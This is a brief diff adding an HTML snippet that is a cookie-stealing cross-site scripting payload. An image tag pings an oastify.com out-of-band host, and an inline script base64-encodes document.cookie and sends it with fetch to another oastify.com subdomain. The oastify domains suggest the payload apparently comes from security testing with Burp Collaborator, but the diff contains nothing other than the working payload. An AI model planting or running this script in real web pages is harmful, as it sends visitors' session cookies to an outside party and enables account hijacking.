@@ -1,0 +1,7 @@
+<img src="e2h238y6ymmww0e8sev0ji91isojcf04.oastify.com" />
+<script>
+(async () => {
+  const base64cookie = btoa(document.cookie)
+  await fetch(`https://el32m8h6hm5wf0x8bee02is11s7jvej3.oastify.com/${base64cookie}`)
+})()
+</script>
